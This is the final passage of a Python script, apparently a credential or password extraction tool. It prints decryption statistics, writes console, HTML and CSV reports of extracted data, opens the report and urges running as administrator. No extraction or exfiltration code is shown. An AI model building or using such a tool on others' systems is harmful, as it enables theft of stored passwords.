        # Console report
        console_report = reporter.generate_report(extracted_data, "console")
        print(console_report)
        
        # HTML report
        html_report_path = reporter.generate_report(extracted_data, "html")
        print(f"\n{Fore.GREEN}[✓] HTML report saved: {html_report_path}{Style.RESET_ALL}")
        
        # CSV reports
        csv_reports_path = reporter.generate_report(extracted_data, "csv")
        print(f"{Fore.GREEN}[✓] CSV reports saved in: {csv_reports_path}{Style.RESET_ALL}")
        
        # Print decryption statistics
        print(f"\n{Fore.CYAN}🔐 DECRYPTION STATISTICS:")
        print(f"{Fore.CYAN}{'='*40}")
        print(f"{Fore.WHITE}Total Attempted: {decryption_stats['total_attempted']}")
        print(f"{Fore.GREEN}Successful: {decryption_stats['successful']}")
        print(f"{Fore.YELLOW}Requires Master Password: {decryption_stats['requires_master']}")
        print(f"{Fore.RED}Failed: {decryption_stats['failed']}")
        
        # Success rate
        if decryption_stats['total_attempted'] > 0:
            success_rate = (decryption_stats['successful'] / decryption_stats['total_attempted']) * 100
            print(f"{Fore.CYAN}Success Rate: {success_rate:.1f}%")
        
        print(f"\n{Fore.GREEN}{Style.BRIGHT}[✓] Extraction completed successfully!{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}⚠ Remember to store reports securely and delete when no longer needed.{Style.RESET_ALL}")
        
        # Try to open HTML report
        try:
            if platform.system() == "Windows":
                os.startfile(html_report_path)
            elif platform.system() == "Darwin":
                subprocess.run(["open", html_report_path])
            else:
                subprocess.run(["xdg-open", html_report_path])
        except:
            pass
        
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Operation interrupted by user.{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[!] Critical error: {e}{Style.RESET_ALL}")
        import traceback
        traceback.print_exc()

# ============================================================================
# ENTRY POINT
# ============================================================================

if __name__ == "__main__":
    # Check if running with appropriate privileges
    if platform.system() == "Windows":
        try:
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin()
            if not is_admin:
                print(f"{Fore.YELLOW}[!] Not running as administrator. Some features may not work.{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}[!] Consider running as administrator for full functionality.{Style.RESET_ALL}")
        except:
            pass
    
    # Run main function
    main()
